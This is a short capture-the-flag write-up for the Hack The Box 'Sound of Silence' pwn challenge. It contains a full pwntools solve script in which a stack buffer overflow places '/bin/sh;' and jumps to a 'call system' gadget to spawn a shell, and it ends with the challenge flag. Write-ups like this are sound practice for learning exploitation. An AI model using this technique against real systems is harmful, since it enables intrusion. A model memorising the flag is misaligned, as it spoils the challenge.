# Sound of Silence

## Solution
So setting /bin/sh to the lower side, such that moving rax => rdi we are able to put the address of /bin/sh; into rdi. The ; is used to stop the shell from reading anymore bytes to our argument since there will be extra bytes at the end.

**Note:** This is not the [intended solution](https://github.com/hackthebox/cyber-apocalypse-2024/blob/main/pwn/%5BMedium%5D%20Sound%20of%20Silence/README.md).

## Solve Script
``` python
from pwn import *
from ctfkit.bp import *

context.binary = 'sound_of_silence'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

# mov rdi, rax
# call system
main_system = 0x401169

def main():
  proc = get_process()

  # place /bin/sh on the stack, then jump to call system
  payload = b''.join([
    b'A'*32,
    b'/bin/sh;',
    p64(main_system)
  ])

  proc.sendlineafter(b'>> ', payload)
  proc.interactive()

if __name__ == '__main__':
  parse_args()
  main()
```

Flag: HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}